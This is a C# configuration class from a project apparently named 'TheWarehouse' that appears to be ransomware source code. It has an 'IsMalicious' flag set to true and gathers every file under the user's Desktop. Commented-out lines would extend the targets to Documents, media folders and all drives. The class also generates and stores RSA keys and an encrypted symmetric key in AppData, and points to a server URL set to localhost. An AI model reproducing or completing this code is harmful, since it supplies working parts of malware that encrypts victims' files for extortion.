using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using TheWarehouse.Algorithm;
using TheWarehouse.Utils;

namespace TheWarehouse.Config
{
    public class Configuration
    {
        public static Configuration Instance { get; set; } = new Configuration();

        public bool IsMalicious { get; set; } = true;

        public List<string> Directories { get; private set; } = new List<string>();

        public string SymmetricalKey { get; private set; }

        public string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public string KeysFile => Path.Combine(AppData, "keys.dat");
        public string EncFile => Path.Combine(AppData, "enc.dat");

        public string ServerUrl => "http://localhost/";

        private readonly BlockingCollection<string> collection = new BlockingCollection<string>();

        public Configuration()
        {
            Directories.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            /*
            Directories.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            Directories.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
            Directories.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            Directories.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
            */

            /*
            try
            { 
                DriveInfo[] allDrives = DriveInfo.GetDrives();

                foreach (DriveInfo drive in allDrives.Where(x => x.IsReady))
                {
                    Directories.Add(drive.Name);
                }
            }
            catch (Exception e) { }
            */
        }

        public IEnumerable<string> GetAllFiles()
        {
            Task.Factory.StartNew(() => CollectFiles());
            return collection.GetConsumingEnumerable();
        }

        private void CollectFiles()
        {
            try
            {
                foreach (string dir in Directories)
                {
                    foreach (var file in Directory.EnumerateFiles(dir, "*", SearchOption.AllDirectories))
                    {
                        collection.Add(file);
                    }
                }
            } catch (Exception e) { }
            finally
            {
                collection.CompleteAdding();
            }
        }

        public void GenerateKey()
        {
            try
            {
                string publicKey, privateKey;

                if (!File.Exists(KeysFile))
                {
                    RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();

                    publicKey = rsa.ToXmlString(false);
                    privateKey = rsa.ToXmlString(true);

                    File.WriteAllText(KeysFile, publicKey + Environment.NewLine + privateKey);
                    rsa.Dispose();
                }
                else
                {
                    var lines = File.ReadAllLines(KeysFile);

                    publicKey = lines[0];
                    privateKey = lines[1];
                }

                if (!File.Exists(EncFile))
                {
                    RSAService.Encrypt(publicKey, Strings.Generate(32), EncFile);

                    SymmetricalKey = File.ReadAllText(EncFile);
                }
                else
                {
                    SymmetricalKey = File.ReadAllText(EncFile);
                }
            } catch(Exception e) { }
        }
    }
}